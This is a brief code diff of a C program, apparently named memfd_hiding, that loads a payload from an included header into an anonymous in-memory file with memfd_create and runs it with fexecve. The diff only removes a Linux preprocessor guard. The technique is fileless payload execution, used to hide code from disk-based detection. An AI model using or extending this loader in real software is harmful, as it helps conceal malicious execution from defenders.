@@ -28,7 +28,6 @@ chmod +x memfd_hiding
 #include "payload.h"
 
 void createPayloadFile() {
-    #if defined(__linux__)
     int fd = memfd_create("", MFD_CLOEXEC);
     if (fd == -1) {
         perror("memfd_create");
@@ -52,7 +51,6 @@ void createPayloadFile() {
 
     perror("fexecve");
     close(fd);
-    #endif
 }
 
 int main() {
